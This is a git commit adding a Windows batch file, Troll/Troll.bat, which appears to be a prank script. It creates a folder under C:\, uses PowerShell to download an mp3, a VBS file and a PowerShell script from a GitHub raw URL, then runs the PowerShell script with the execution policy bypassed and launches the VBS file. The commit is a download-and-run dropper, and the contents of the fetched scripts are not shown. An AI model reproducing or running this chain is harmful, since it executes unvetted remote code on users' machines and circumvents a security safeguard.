2b66183cb363ab2947b299cbae95d7393d826d42
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2022-08-17 12:21:28 +0800

    Add files via upload

---
+++ Troll/Troll.bat
@@ -0,0 +1,8 @@
+cd C:\
+mkdir Cheese
+cd cheese
+powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Troll/Trolled.mp3' -OutFile ".\Trolled.mp3"
+powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Troll/Test.vbs' -OutFile ".\Test.vbs"
+powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Troll/A.ps1' -OutFile ".\A.ps1"
+powershell -ExecutionPolicy Bypass -File A.ps1
+start Test.vbs
